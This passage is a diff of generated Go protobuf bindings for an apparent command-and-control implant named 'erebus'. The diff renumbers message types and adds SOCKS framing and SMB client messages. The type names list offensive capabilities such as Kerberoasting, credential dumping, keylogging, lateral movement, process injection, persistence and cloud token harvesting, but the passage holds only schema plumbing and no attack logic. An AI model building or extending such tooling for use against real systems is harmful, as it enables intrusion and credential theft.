-	(*LDAPEntry)(nil),            // 30: erebus.c2.LDAPEntry
-	(*LDAPValues)(nil),           // 31: erebus.c2.LDAPValues
-	(*KerberoastConfig)(nil),     // 32: erebus.c2.KerberoastConfig
-	(*KerberoastResult)(nil),     // 33: erebus.c2.KerberoastResult
-	(*KerberoastHash)(nil),       // 34: erebus.c2.KerberoastHash
-	(*ASREPRoastConfig)(nil),     // 35: erebus.c2.ASREPRoastConfig
-	(*ASREPRoastResult)(nil),     // 36: erebus.c2.ASREPRoastResult
-	(*ASREPHash)(nil),            // 37: erebus.c2.ASREPHash
-	(*CredDumpConfig)(nil),       // 38: erebus.c2.CredDumpConfig
-	(*CredDumpResult)(nil),       // 39: erebus.c2.CredDumpResult
-	(*Credential)(nil),           // 40: erebus.c2.Credential
-	(*LateralMoveConfig)(nil),    // 41: erebus.c2.LateralMoveConfig
-	(*LateralMoveResult)(nil),    // 42: erebus.c2.LateralMoveResult
-	(*InjectTask)(nil),           // 43: erebus.c2.InjectTask
-	(*InjectResult)(nil),         // 44: erebus.c2.InjectResult
-	(*PELoadTask)(nil),           // 45: erebus.c2.PELoadTask
-	(*PELoadResult)(nil),         // 46: erebus.c2.PELoadResult
-	(*ScreenshotTask)(nil),       // 47: erebus.c2.ScreenshotTask
-	(*ScreenshotResult)(nil),     // 48: erebus.c2.ScreenshotResult
-	(*KeylogStartTask)(nil),      // 49: erebus.c2.KeylogStartTask
-	(*KeylogStopTask)(nil),       // 50: erebus.c2.KeylogStopTask
-	(*KeylogDumpTask)(nil),       // 51: erebus.c2.KeylogDumpTask
-	(*KeylogDumpResult)(nil),     // 52: erebus.c2.KeylogDumpResult
-	(*KeylogEntry)(nil),          // 53: erebus.c2.KeylogEntry
-	(*SocksStartTask)(nil),       // 54: erebus.c2.SocksStartTask
-	(*SocksStartResult)(nil),     // 55: erebus.c2.SocksStartResult
-	(*SocksStopTask)(nil),        // 56: erebus.c2.SocksStopTask
-	(*SocksStopResult)(nil),      // 57: erebus.c2.SocksStopResult
-	(*PersistConfig)(nil),        // 58: erebus.c2.PersistConfig
-	(*PersistResult)(nil),        // 59: erebus.c2.PersistResult
-	(*PrivescConfig)(nil),        // 60: erebus.c2.PrivescConfig
-	(*PrivescResult)(nil),        // 61: erebus.c2.PrivescResult
-	(*CloudHarvestConfig)(nil),   // 62: erebus.c2.CloudHarvestConfig
-	(*CloudHarvestResult)(nil),   // 63: erebus.c2.CloudHarvestResult
-	(*CloudToken)(nil),           // 64: erebus.c2.CloudToken
-	(*CloudCredential)(nil),      // 65: erebus.c2.CloudCredential
-	nil,                          // 66: erebus.c2.LDAPEntry.AttributesEntry
+	(SocksFrameOp)(0),            // 1: erebus.c2.SocksFrameOp
+	(*Register)(nil),             // 2: erebus.c2.Register
+	(*RegisterResponse)(nil),     // 3: erebus.c2.RegisterResponse
+	(*Beacon)(nil),               // 4: erebus.c2.Beacon
+	(*BeaconResponse)(nil),       // 5: erebus.c2.BeaconResponse
+	(*Task)(nil),                 // 6: erebus.c2.Task
+	(*TaskResult)(nil),           // 7: erebus.c2.TaskResult
+	(*BeaconResultsPayload)(nil), // 8: erebus.c2.BeaconResultsPayload
+	(*BeaconTasksPayload)(nil),   // 9: erebus.c2.BeaconTasksPayload
+	(*ShellTask)(nil),            // 10: erebus.c2.ShellTask
+	(*ShellResult)(nil),          // 11: erebus.c2.ShellResult
+	(*FileDownloadTask)(nil),     // 12: erebus.c2.FileDownloadTask
+	(*FileDownloadResult)(nil),   // 13: erebus.c2.FileDownloadResult
+	(*FileUploadTask)(nil),       // 14: erebus.c2.FileUploadTask
+	(*FileUploadResult)(nil),     // 15: erebus.c2.FileUploadResult
+	(*SleepTask)(nil),            // 16: erebus.c2.SleepTask
+	(*ModuleTask)(nil),           // 17: erebus.c2.ModuleTask
+	(*ProcessListTask)(nil),      // 18: erebus.c2.ProcessListTask
+	(*ProcessListResult)(nil),    // 19: erebus.c2.ProcessListResult
+	(*ProcessInfo)(nil),          // 20: erebus.c2.ProcessInfo
+	(*ProcessKillTask)(nil),      // 21: erebus.c2.ProcessKillTask
+	(*ProcessKillResult)(nil),    // 22: erebus.c2.ProcessKillResult
+	(*NetIfconfigTask)(nil),      // 23: erebus.c2.NetIfconfigTask
+	(*NetIfconfigResult)(nil),    // 24: erebus.c2.NetIfconfigResult
+	(*NetInterface)(nil),         // 25: erebus.c2.NetInterface
+	(*NetPortscanTask)(nil),      // 26: erebus.c2.NetPortscanTask
+	(*NetPortscanResult)(nil),    // 27: erebus.c2.NetPortscanResult
+	(*PortResult)(nil),           // 28: erebus.c2.PortResult
+	(*LDAPEnumConfig)(nil),       // 29: erebus.c2.LDAPEnumConfig
+	(*LDAPEnumResult)(nil),       // 30: erebus.c2.LDAPEnumResult
+	(*LDAPEntry)(nil),            // 31: erebus.c2.LDAPEntry
+	(*LDAPValues)(nil),           // 32: erebus.c2.LDAPValues
+	(*KerberoastConfig)(nil),     // 33: erebus.c2.KerberoastConfig
+	(*KerberoastResult)(nil),     // 34: erebus.c2.KerberoastResult
+	(*KerberoastHash)(nil),       // 35: erebus.c2.KerberoastHash
+	(*ASREPRoastConfig)(nil),     // 36: erebus.c2.ASREPRoastConfig
+	(*ASREPRoastResult)(nil),     // 37: erebus.c2.ASREPRoastResult
+	(*ASREPHash)(nil),            // 38: erebus.c2.ASREPHash
+	(*CredDumpConfig)(nil),       // 39: erebus.c2.CredDumpConfig
+	(*CredDumpResult)(nil),       // 40: erebus.c2.CredDumpResult
+	(*Credential)(nil),           // 41: erebus.c2.Credential
+	(*LateralMoveConfig)(nil),    // 42: erebus.c2.LateralMoveConfig
+	(*LateralMoveResult)(nil),    // 43: erebus.c2.LateralMoveResult
+	(*InjectTask)(nil),           // 44: erebus.c2.InjectTask
+	(*InjectResult)(nil),         // 45: erebus.c2.InjectResult
+	(*PELoadTask)(nil),           // 46: erebus.c2.PELoadTask
+	(*PELoadResult)(nil),         // 47: erebus.c2.PELoadResult
+	(*ScreenshotTask)(nil),       // 48: erebus.c2.ScreenshotTask
+	(*ScreenshotResult)(nil),     // 49: erebus.c2.ScreenshotResult
+	(*KeylogStartTask)(nil),      // 50: erebus.c2.KeylogStartTask
+	(*KeylogStopTask)(nil),       // 51: erebus.c2.KeylogStopTask
+	(*KeylogDumpTask)(nil),       // 52: erebus.c2.KeylogDumpTask
+	(*KeylogDumpResult)(nil),     // 53: erebus.c2.KeylogDumpResult
+	(*KeylogEntry)(nil),          // 54: erebus.c2.KeylogEntry
+	(*SocksStartTask)(nil),       // 55: erebus.c2.SocksStartTask
+	(*SocksStartResult)(nil),     // 56: erebus.c2.SocksStartResult
+	(*SocksStopTask)(nil),        // 57: erebus.c2.SocksStopTask
+	(*SocksStopResult)(nil),      // 58: erebus.c2.SocksStopResult
+	(*SocksFrame)(nil),           // 59: erebus.c2.SocksFrame
+	(*PersistConfig)(nil),        // 60: erebus.c2.PersistConfig
+	(*PersistResult)(nil),        // 61: erebus.c2.PersistResult
+	(*PrivescConfig)(nil),        // 62: erebus.c2.PrivescConfig
+	(*PrivescResult)(nil),        // 63: erebus.c2.PrivescResult
+	(*CloudHarvestConfig)(nil),   // 64: erebus.c2.CloudHarvestConfig
+	(*CloudHarvestResult)(nil),   // 65: erebus.c2.CloudHarvestResult
+	(*CloudToken)(nil),           // 66: erebus.c2.CloudToken
+	(*CloudCredential)(nil),      // 67: erebus.c2.CloudCredential
+	(*SMBClientConfig)(nil),      // 68: erebus.c2.SMBClientConfig
+	(*SMBClientResult)(nil),      // 69: erebus.c2.SMBClientResult
+	nil,                          // 70: erebus.c2.LDAPEntry.AttributesEntry
 }
 var file_c2_proto_depIdxs = []int32{
-	6,  // 0: erebus.c2.Beacon.results:type_name -> erebus.c2.TaskResult
-	5,  // 1: erebus.c2.BeaconResponse.tasks:type_name -> erebus.c2.Task
+	7,  // 0: erebus.c2.Beacon.results:type_name -> erebus.c2.TaskResult
+	6,  // 1: erebus.c2.BeaconResponse.tasks:type_name -> erebus.c2.Task
 	0,  // 2: erebus.c2.Task.task_type:type_name -> erebus.c2.TaskType
-	6,  // 3: erebus.c2.BeaconResultsPayload.results:type_name -> erebus.c2.TaskResult
-	5,  // 4: erebus.c2.BeaconTasksPayload.tasks:type_name -> erebus.c2.Task
-	19, // 5: erebus.c2.ProcessListResult.processes:type_name -> erebus.c2.ProcessInfo
-	24, // 6: erebus.c2.NetIfconfigResult.interfaces:type_name -> erebus.c2.NetInterface
-	27, // 7: erebus.c2.NetPortscanResult.ports:type_name -> erebus.c2.PortResult
-	30, // 8: erebus.c2.LDAPEnumResult.entries:type_name -> erebus.c2.LDAPEntry
-	66, // 9: erebus.c2.LDAPEntry.attributes:type_name -> erebus.c2.LDAPEntry.AttributesEntry
-	34, // 10: erebus.c2.KerberoastResult.hashes:type_name -> erebus.c2.KerberoastHash
-	37, // 11: erebus.c2.ASREPRoastResult.hashes:type_name -> erebus.c2.ASREPHash
-	40, // 12: erebus.c2.CredDumpResult.credentials:type_name -> erebus.c2.Credential
-	53, // 13: erebus.c2.KeylogDumpResult.entries:type_name -> erebus.c2.KeylogEntry
-	64, // 14: erebus.c2.CloudHarvestResult.tokens:type_name -> erebus.c2.CloudToken
-	65, // 15: erebus.c2.CloudHarvestResult.credentials:type_name -> erebus.c2.CloudCredential
-	31, // 16: erebus.c2.LDAPEntry.AttributesEntry.value:type_name -> erebus.c2.LDAPValues
-	17, // [17:17] is the sub-list for method output_type
-	17, // [17:17] is the sub-list for method input_type
-	17, // [17:17] is the sub-list for extension type_name
-	17, // [17:17] is the sub-list for extension extendee
-	0,  // [0:17] is the sub-list for field type_name
+	7,  // 3: erebus.c2.BeaconResultsPayload.results:type_name -> erebus.c2.TaskResult
+	59, // 4: erebus.c2.BeaconResultsPayload.socks_frames:type_name -> erebus.c2.SocksFrame
+	6,  // 5: erebus.c2.BeaconTasksPayload.tasks:type_name -> erebus.c2.Task
+	59, // 6: erebus.c2.BeaconTasksPayload.socks_frames:type_name -> erebus.c2.SocksFrame
+	20, // 7: erebus.c2.ProcessListResult.processes:type_name -> erebus.c2.ProcessInfo
+	25, // 8: erebus.c2.NetIfconfigResult.interfaces:type_name -> erebus.c2.NetInterface
+	28, // 9: erebus.c2.NetPortscanResult.ports:type_name -> erebus.c2.PortResult
+	31, // 10: erebus.c2.LDAPEnumResult.entries:type_name -> erebus.c2.LDAPEntry
+	70, // 11: erebus.c2.LDAPEntry.attributes:type_name -> erebus.c2.LDAPEntry.AttributesEntry
+	35, // 12: erebus.c2.KerberoastResult.hashes:type_name -> erebus.c2.KerberoastHash
+	38, // 13: erebus.c2.ASREPRoastResult.hashes:type_name -> erebus.c2.ASREPHash
+	41, // 14: erebus.c2.CredDumpResult.credentials:type_name -> erebus.c2.Credential
+	54, // 15: erebus.c2.KeylogDumpResult.entries:type_name -> erebus.c2.KeylogEntry
+	1,  // 16: erebus.c2.SocksFrame.op:type_name -> erebus.c2.SocksFrameOp
+	66, // 17: erebus.c2.CloudHarvestResult.tokens:type_name -> erebus.c2.CloudToken
+	67, // 18: erebus.c2.CloudHarvestResult.credentials:type_name -> erebus.c2.CloudCredential
+	32, // 19: erebus.c2.LDAPEntry.AttributesEntry.value:type_name -> erebus.c2.LDAPValues
+	20, // [20:20] is the sub-list for method output_type
+	20, // [20:20] is the sub-list for method input_type
+	20, // [20:20] is the sub-list for extension type_name
+	20, // [20:20] is the sub-list for extension extendee
+	0,  // [0:20] is the sub-list for field type_name
 }
 
 func init() { file_c2_proto_init() }
@@ -4607,8 +5015,8 @@ func file_c2_proto_init() {
 		File: protoimpl.DescBuilder{
 			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
 			RawDescriptor: unsafe.Slice(unsafe.StringData(file_c2_proto_rawDesc), len(file_c2_proto_rawDesc)),
-			NumEnums:      1,
-			NumMessages:   66,
+			NumEnums:      2,
+			NumMessages:   69,
 			NumExtensions: 0,
 			NumServices:   0,
 		},
